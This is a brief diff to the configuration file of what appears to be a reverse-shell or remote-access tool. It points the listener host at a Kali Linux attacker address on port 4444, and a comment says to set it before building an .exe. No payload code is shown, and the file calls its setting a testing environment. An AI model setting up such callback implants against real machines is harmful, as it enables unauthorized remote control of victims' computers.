@@ -4,7 +4,8 @@ Modify these settings for your testing environment
 """
 
 # Listener configuration
-LISTENER_HOST = '127.0.0.1'  # Change to attacker's IP address
+# IMPORTANT: Change this to your Kali Linux IP address before building .exe
+LISTENER_HOST = '192.168.1.100'  # Change to your Kali Linux IP address
 LISTENER_PORT = 4444
 
 # Feature flags
